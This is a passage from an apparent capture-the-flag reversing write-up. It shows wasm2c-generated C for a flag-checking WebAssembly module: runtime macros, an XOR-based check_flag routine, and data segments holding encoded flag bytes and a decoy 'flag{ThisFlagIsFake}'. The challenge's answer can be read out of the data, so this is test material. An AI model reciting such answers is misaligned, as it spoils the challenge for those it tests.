WASM_RT_MODULE_PREFIX</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WASM_RT_PASTE_(x, y) x ## y</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WASM_RT_PASTE(x, y) WASM_RT_PASTE_(x, y)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WASM_RT_ADD_PREFIX(x) WASM_RT_PASTE(WASM_RT_MODULE_PREFIX, x)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* TODO(binji): only use stdint.h types in header */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">uint8_t</span> u8;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int8_t</span> s8;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">uint16_t</span> u16;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int16_t</span> s16;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">uint32_t</span> u32;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int32_t</span> s32;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">uint64_t</span> u64;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int64_t</span> s64;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">float</span> f32;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">double</span> f64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="type">void</span> <span class="title function_">WASM_RT_ADD_PREFIX</span><span class="params">(init)</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* export: &#x27;memory&#x27; */</span></span><br><span class="line"><span class="keyword">extern</span> <span class="title function_">wasm_rt_memory_t</span> <span class="params">(*WASM_RT_ADD_PREFIX(Z_memory))</span>;</span><br><span class="line"><span class="comment">/* export: &#x27;get_buf&#x27; */</span></span><br><span class="line"><span class="keyword">extern</span> <span class="title function_">u32</span> <span class="params">(*WASM_RT_ADD_PREFIX(Z_get_bufZ_iv))</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="comment">/* export: &#x27;check_flag&#x27; */</span></span><br><span class="line"><span class="keyword">extern</span> <span class="title function_">u32</span> <span class="params">(*WASM_RT_ADD_PREFIX(Z_check_flagZ_ii))</span><span class="params">(u32)</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __cplusplus</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span>  <span class="comment">/* __FLAG_H_GENERATED_ */</span></span></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// flag.c</span></span><br><span class="line"><span class="comment">/* Automically generated by wasm2c */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;./flag.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> UNLIKELY(x) __builtin_expect(!!(x), 0)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LIKELY(x) __builtin_expect(!!(x), 1)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TRAP(x) (wasm_rt_trap(WASM_RT_TRAP_##x), 0)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FUNC_PROLOGUE                                            \</span></span><br><span class="line"><span class="meta">  <span class="keyword">if</span> (++wasm_rt_call_stack_depth &gt; WASM_RT_MAX_CALL_STACK_DEPTH) \</span></span><br><span class="line"><span class="meta">    TRAP(EXHAUSTION)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FUNC_EPILOGUE --wasm_rt_call_stack_depth</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> UNREACHABLE TRAP(UNREACHABLE)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CALL_INDIRECT(table, t, ft, x, ...)          \</span></span><br><span class="line"><span class="meta">  (LIKELY((x) &lt; table.size &amp;&amp; table.data[x].func &amp;&amp;  \</span></span><br><span class="line"><span class="meta">          table.data[x].func_type == func_types[ft]) \</span></span><br><span class="line"><span class="meta">       ? ((t)table.data[x].func)(__VA_ARGS__)        \</span></span><br><span class="line"><span class="meta">       : TRAP(CALL_INDIRECT))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> WASM_RT_MEMCHECK_SIGNAL_HANDLER</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MEMCHECK(mem, a, t)</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MEMCHECK(mem, a, t)  \</span></span><br><span class="line"><span class="meta">  <span class="keyword">if</span> (UNLIKELY((a) + sizeof(t) &gt; mem-&gt;size)) TRAP(OOB)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEFINE_LOAD(name, t1, t2, t3)                        \</span></span><br><span class="line"><span class="meta">  static inline t3 name(wasm_rt_memory_t* mem, u64 addr) &#123;   \</span></span><br><span class="line"><span class="meta">    MEMCHECK(mem, addr, t1);                                 \</span></span><br><span class="line"><span class="meta">    t1 result;                                               \</span></span><br><span class="line"><span class="meta">    __builtin_memcpy(&amp;result, &amp;mem-&gt;data[addr], sizeof(t1)); \</span></span><br><span class="line"><span class="meta">    return (t3)(t2)result;                                   \</span></span><br><span class="line"><span class="meta">  &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEFINE_STORE(name, t1, t2)                                     \</span></span><br><span class="line"><span class="meta">  static inline void name(wasm_rt_memory_t* mem, u64 addr, t2 value) &#123; \</span></span><br><span class="line"><span class="meta">    MEMCHECK(mem, addr, t1);                                           \</span></span><br><span class="line"><span class="meta">    t1 wrapped = (t1)value;                                            \</span></span><br><span class="line"><span class="meta">    __builtin_memcpy(&amp;mem-&gt;data[addr], &amp;wrapped, sizeof(t1));          \</span></span><br><span class="line"><span class="meta">  &#125;</span></span><br><span class="line"></span><br><span class="line">DEFINE_LOAD(i32_load, u32, u32, u32);</span><br><span class="line">DEFINE_LOAD(i64_load, u64, u64, u64);</span><br><span class="line">DEFINE_LOAD(f32_load, f32, f32, f32);</span><br><span class="line">DEFINE_LOAD(f64_load, f64, f64, f64);</span><br><span class="line">DEFINE_LOAD(i32_load8_s, s8, s32, u32);</span><br><span class="line">DEFINE_LOAD(i64_load8_s, s8, s64, u64);</span><br><span class="line">DEFINE_LOAD(i32_load8_u, u8, u32, u32);</span><br><span class="line">DEFINE_LOAD(i64_load8_u, u8, u64, u64);</span><br><span class="line">DEFINE_LOAD(i32_load16_s, s16, s32, u32);</span><br><span class="line">DEFINE_LOAD(i64_load16_s, s16, s64, u64);</span><br><span class="line">DEFINE_LOAD(i32_load16_u, u16, u32, u32);</span><br><span class="line">DEFINE_LOAD(i64_load16_u, u16, u64, u64);</span><br><span class="line">DEFINE_LOAD(i64_load32_s, s32, s64, u64);</span><br><span class="line">DEFINE_LOAD(i64_load32_u, u32, u64, u64);</span><br><span class="line">DEFINE_STORE(i32_store, u32, u32);</span><br><span class="line">DEFINE_STORE(i64_store, u64, u64);</span><br><span class="line">DEFINE_STORE(f32_store, f32, f32);</span><br><span class="line">DEFINE_STORE(f64_store, f64, f64);</span><br><span class="line">DEFINE_STORE(i32_store8, u8, u32);</span><br><span class="line">DEFINE_STORE(i32_store16, u16, u32);</span><br><span class="line">DEFINE_STORE(i64_store8, u8, u64);</span><br><span class="line">DEFINE_STORE(i64_store16, u16, u64);</span><br><span class="line">DEFINE_STORE(i64_store32, u32, u64);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> I32_CLZ(x) ((x) ? __builtin_clz(x) : 32)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> I64_CLZ(x) ((x) ? __builtin_clzll(x) : 64)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> I32_CTZ(x) ((x) ? __builtin_ctz(x) : 32)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> I64_CTZ(x) ((x) ? __builtin_ctzll(x) : 64)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> I32_POPCNT(x) (__builtin_popcount(x))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> I64_POPCNT(x) (__builtin_popcountll(x))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DIV_S(ut, min, x, y)                                 \</span></span><br><span class="line"><span class="meta">   ((UNLIKELY((y) == 0)) ?                TRAP(DIV_BY_ZERO)  \</span></span><br><span class="line"><span class="meta">  : (UNLIKELY((x) == min &amp;&amp; (y) == -1)) ? TRAP(INT_OVERFLOW) \</span></span><br><span class="line"><span class="meta">  : (ut)((x) / (y)))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> REM_S(ut, min, x, y)                                \</span></span><br><span class="line"><span class="meta">   ((UNLIKELY((y) == 0)) ?                TRAP(DIV_BY_ZERO) \</span></span><br><span class="line"><span class="meta">  : (UNLIKELY((x) == min &amp;&amp; (y) == -1)) ? 0                 \</span></span><br><span class="line"><span class="meta">  : (ut)((x) % (y)))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> I32_DIV_S(x, y) DIV_S(u32, INT32_MIN, (s32)x, (s32)y)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> I64_DIV_S(x, y) DIV_S(u64, INT64_MIN, (s64)x, (s64)y)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> I32_REM_S(x, y) REM_S(u32, INT32_MIN, (s32)x, (s32)y)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> I64_REM_S(x, y) REM_S(u64, INT64_MIN, (s64)x, (s64)y)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DIVREM_U(op, x, y) \</span></span><br><span class="line"><span class="meta">  ((UNLIKELY((y) == 0)) ? TRAP(DIV_BY_ZERO) : ((x) op (y)))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DIV_U(x, y) DIVREM_U(/, x, y)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> REM_U(x, y) DIVREM_U(%, x, y)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ROTL(x, y, mask) \</span></span><br><span class="line"><span class="meta">  (((x) <span class="string">&lt;&lt; ((y) &amp; (mask))) | ((x) &gt;</span>&gt; (((mask) - (y) + 1) &amp; (mask))))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ROTR(x, y, mask) \</span></span><br><span class="line"><span class="meta">  (((x) &gt;&gt; ((y) &amp; (mask))) | ((x) &lt;&lt; (((mask) - (y) + 1) &amp; (mask))))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> I32_ROTL(x, y) ROTL(x, y, 31)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> I64_ROTL(x, y) ROTL(x, y, 63)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> I32_ROTR(x, y) ROTR(x, y, 31)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> I64_ROTR(x, y) ROTR(x, y, 63)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FMIN(x, y)                                          \</span></span><br><span class="line"><span class="meta">   ((UNLIKELY((x) != (x))) ? NAN                            \</span></span><br><span class="line"><span class="meta">  : (UNLIKELY((y) != (y))) ? NAN                            \</span></span><br><span class="line"><span class="meta">  : (UNLIKELY((x) == 0 &amp;&amp; (y) == 0)) ? (signbit(x) ? x : y) \</span></span><br><span class="line"><span class="meta">  : (x &lt; y) ? x : y)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FMAX(x, y)                                          \</span></span><br><span class="line"><span class="meta">   ((UNLIKELY((x) != (x))) ? NAN                            \</span></span><br><span class="line"><span class="meta">  : (UNLIKELY((y) != (y))) ? NAN                            \</span></span><br><span class="line"><span class="meta">  : (UNLIKELY((x) == 0 &amp;&amp; (y) == 0)) ? (signbit(x) ? y : x) \</span></span><br><span class="line"><span class="meta">  : (x &gt; y) ? x : y)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TRUNC_S(ut, st, ft, min, minop, max, x)                             \</span></span><br><span class="line"><span class="meta">  ((UNLIKELY((x) != (x)))                        ? TRAP(INVALID_CONVERSION) \</span></span><br><span class="line"><span class="meta">   : (UNLIKELY(!((x)minop(min) &amp;&amp; (x) &lt; (max)))) ? TRAP(INT_OVERFLOW)       \</span></span><br><span class="line"><span class="meta">                                                 : (ut)(st)(x))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> I32_TRUNC_S_F32(x) TRUNC_S(u32, s32, f32, (f32)INT32_MIN, &gt;=, 2147483648.f, x)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> I64_TRUNC_S_F32(x) TRUNC_S(u64, s64, f32, (f32)INT64_MIN, &gt;=, (f32)INT64_MAX, x)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> I32_TRUNC_S_F64(x) TRUNC_S(u32, s32, f64, -2147483649., &gt;, 2147483648., x)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> I64_TRUNC_S_F64(x) TRUNC_S(u64, s64, f64, (f64)INT64_MIN, &gt;=, (f64)INT64_MAX, x)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TRUNC_U(ut, ft, max, x)                                            \</span></span><br><span class="line"><span class="meta">  ((UNLIKELY((x) != (x)))                       ? TRAP(INVALID_CONVERSION) \</span></span><br><span class="line"><span class="meta">   : (UNLIKELY(!((x) &gt; (ft)-1 &amp;&amp; (x) &lt; (max)))) ? TRAP(INT_OVERFLOW)       \</span></span><br><span class="line"><span class="meta">                                                : (ut)(x))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> I32_TRUNC_U_F32(x) TRUNC_U(u32, f32, 4294967296.f, x)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> I64_TRUNC_U_F32(x) TRUNC_U(u64, f32, (f32)UINT64_MAX, x)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> I32_TRUNC_U_F64(x) TRUNC_U(u32, f64, 4294967296.,  x)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> I64_TRUNC_U_F64(x) TRUNC_U(u64, f64, (f64)UINT64_MAX, x)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEFINE_REINTERPRET(name, t1, t2)  \</span></span><br><span class="line"><span class="meta">  static inline t2 name(t1 x) &#123;           \</span></span><br><span class="line"><span class="meta">    t2 result;                            \</span></span><br><span class="line"><span class="meta">    memcpy(&amp;result, &amp;x, sizeof(result));  \</span></span><br><span class="line"><span class="meta">    return result;                        \</span></span><br><span class="line"><span class="meta">  &#125;</span></span><br><span class="line"></span><br><span class="line">DEFINE_REINTERPRET(f32_reinterpret_i32, u32, f32)</span><br><span class="line">DEFINE_REINTERPRET(i32_reinterpret_f32, f32, u32)</span><br><span class="line">DEFINE_REINTERPRET(f64_reinterpret_i64, u64, f64)</span><br><span class="line">DEFINE_REINTERPRET(i64_reinterpret_f64, f64, u64)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> u32 func_types[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">init_func_types</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">  func_types[<span class="number">0</span>] = wasm_rt_register_func_type(<span class="number">0</span>, <span class="number">1</span>, WASM_RT_I32);</span><br><span class="line">  func_types[<span class="number">1</span>] = wasm_rt_register_func_type(<span class="number">1</span>, <span class="number">1</span>, WASM_RT_I32, WASM_RT_I32);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> u32 <span class="title function_">w2c_get_buf</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="type">static</span> u32 <span class="title function_">w2c_check_flag</span><span class="params">(u32)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">init_globals</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">wasm_rt_memory_t</span> w2c_memory;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">wasm_rt_table_t</span> w2c_T0;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> u32 <span class="title function_">w2c_get_buf</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">  FUNC_PROLOGUE;</span><br><span class="line">  u32 w2c_i0;</span><br><span class="line">  w2c_i0 = <span class="number">80u</span>;</span><br><span class="line">  FUNC_EPILOGUE;</span><br><span class="line">  <span class="keyword">return</span> w2c_i0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> u32 <span class="title function_">w2c_check_flag</span><span class="params">(u32 w2c_p0)</span> &#123;</span><br><span class="line">  u32 w2c_l1 = <span class="number">0</span>, w2c_l2 = <span class="number">0</span>;</span><br><span class="line">  FUNC_PROLOGUE;</span><br><span class="line">  u32 w2c_i0, w2c_i1, w2c_i2;</span><br><span class="line">  w2c_i0 = <span class="number">0u</span>;</span><br><span class="line">  w2c_l1 = w2c_i0;</span><br><span class="line">  w2c_i0 = <span class="number">0u</span>;</span><br><span class="line">  w2c_l2 = w2c_i0;</span><br><span class="line">  w2c_L0: </span><br><span class="line">    w2c_i0 = w2c_p0;</span><br><span class="line">    w2c_i1 = w2c_l2;</span><br><span class="line">    w2c_i0 += w2c_i1;</span><br><span class="line">    w2c_i0 = i32_load8_u((&amp;w2c_memory), (u64)(w2c_i0));</span><br><span class="line">    w2c_i1 = w2c_l2;</span><br><span class="line">    w2c_i2 = <span class="number">16u</span>;</span><br><span class="line">    w2c_i1 += w2c_i2;</span><br><span class="line">    w2c_i1 = i32_load8_u((&amp;w2c_memory), (u64)(w2c_i1));</span><br><span class="line">    w2c_i0 ^= w2c_i1;</span><br><span class="line">    w2c_i1 = <span class="number">24u</span>;</span><br><span class="line">    w2c_i0 &lt;&lt;= (w2c_i1 &amp; <span class="number">31</span>);</span><br><span class="line">    w2c_i1 = <span class="number">24u</span>;</span><br><span class="line">    w2c_i0 = (u32)((s32)w2c_i0 &gt;&gt; (w2c_i1 &amp; <span class="number">31</span>));</span><br><span class="line">    w2c_i1 = <span class="number">66u</span>;</span><br><span class="line">    w2c_i0 ^= w2c_i1;</span><br><span class="line">    w2c_i1 = w2c_l1;</span><br><span class="line">    w2c_i0 |= w2c_i1;</span><br><span class="line">    w2c_l1 = w2c_i0;</span><br><span class="line">    w2c_i0 = w2c_l2;</span><br><span class="line">    w2c_i1 = <span class="number">1u</span>;</span><br><span class="line">    w2c_i0 += w2c_i1;</span><br><span class="line">    w2c_l2 = w2c_i0;</span><br><span class="line">    w2c_i1 = <span class="number">23u</span>;</span><br><span class="line">    w2c_i0 = w2c_i0 != w2c_i1;</span><br><span class="line">    <span class="keyword">if</span> (w2c_i0) &#123;<span class="keyword">goto</span> w2c_L0;&#125;</span><br><span class="line">  w2c_i0 = w2c_l1;</span><br><span class="line">  w2c_i0 = !(w2c_i0);</span><br><span class="line">  FUNC_EPILOGUE;</span><br><span class="line">  <span class="keyword">return</span> w2c_i0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> u8 data_segment_data_0[] = &#123;</span><br><span class="line">  <span class="number">0x24</span>, <span class="number">0x2e</span>, <span class="number">0x23</span>, <span class="number">0x25</span>, <span class="number">0x39</span>, <span class="number">0x0a</span>, <span class="number">0x27</span>, <span class="number">0x2e</span>, <span class="number">0x2e</span>, <span class="number">0x2d</span>, <span class="number">0x15</span>, <span class="number">0x27</span>, </span><br><span class="line">  <span class="number">0x20</span>, <span class="number">0x03</span>, <span class="number">0x31</span>, <span class="number">0x31</span>, <span class="number">0x27</span>, <span class="number">0x2f</span>, <span class="number">0x20</span>, <span class="number">0x2e</span>, <span class="number">0x3b</span>, <span class="number">0x3f</span>, <span class="number">0x42</span>, </span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> u8 data_segment_data_1[] = &#123;</span><br><span class="line">  <span class="number">0x66</span>, <span class="number">0x6c</span>, <span class="number">0x61</span>, <span class="number">0x67</span>, <span class="number">0x7b</span>, <span class="number">0x54</span>, <span class="number">0x68</span>, <span class="number">0x69</span>, <span class="number">0x73</span>, <span class="number">0x46</span>, <span class="number">0x6c</span>, <span class="number">0x61</span>, </span><br><span class="line">  <span class="number">0x67</span>, <span class="number">0x49</span>, <span class="number">0x73</span>, <span class="number">0x46</span>, <span class="number">0x61</span>, <span class="number">0x6b</span>, <span class="number">0x65</span>, <span class="number">0x7d</span>, <span class="number">0x00</span>, </span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">init_memory</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">  wasm_rt_allocate_memory((&amp;w2c_memory), <span class="number">1</span>, <span class="number">65536</span>);</span><br><span class="line">  <span class="built_in">memcpy</span>(&amp;(w2c_memory.data[<span class="number">16u</span>]), data_segment_data_0, <span class="number">23</span>);</span><br><span class="line">  <span class="built_in">memcpy</span>(&amp;(w2c_memory.data[<span class="number">48u</span>]), data_segment_data_1, <span class="number">21</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">init_table</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">  <span class="type">uint32_t</span> offset;</span><br><span class="line">  wasm_rt_allocate_table((&amp;w2c_T0), <span class="number">0</span>, <span class="number">4294967295</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* export: &#x27;memory&#x27; */</span></span><br><span class="line"><span class="type">wasm_rt_memory_t</span> (*WASM_RT_ADD_PREFIX(Z_memory));</span><br><span class="line"><span class="comment">/* export: &#x27;get_buf&#x27; */</span></span><br><span class="line">u32 (*WASM_RT_ADD_PREFIX(Z_get_bufZ_iv))(<span class="type">void</span>);</span><br><span class="line"><span class="comment">/* export: &#x27;check_flag&#x27; */</span></span><br><span class="line">u32 (*WASM_RT_ADD_PREFIX(Z_check_flagZ_ii))(u32);</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">init_exports</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">  <span class="comment">/* export: &#x27;memory&#x27; */</span></span><br><span class="line">  WASM_RT_ADD_PREFIX(Z_memory) = (&amp;w2c_memory);</span><br><span class="line">  <span class="comment">/* export: &#x27;get_buf&#x27; */</span></span><br><span class="line">  WASM_RT_ADD_PREFIX(Z_get_bufZ_iv) = (&amp;w2c_get_buf);</span><br><span class="line">  <span class="comment">/* export: &#x27;check_flag&#x27; */</span></span><br><span class="line">  WASM_RT_ADD_PREFIX(Z_check_flagZ_ii) = (&amp;w2c_check_flag);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span 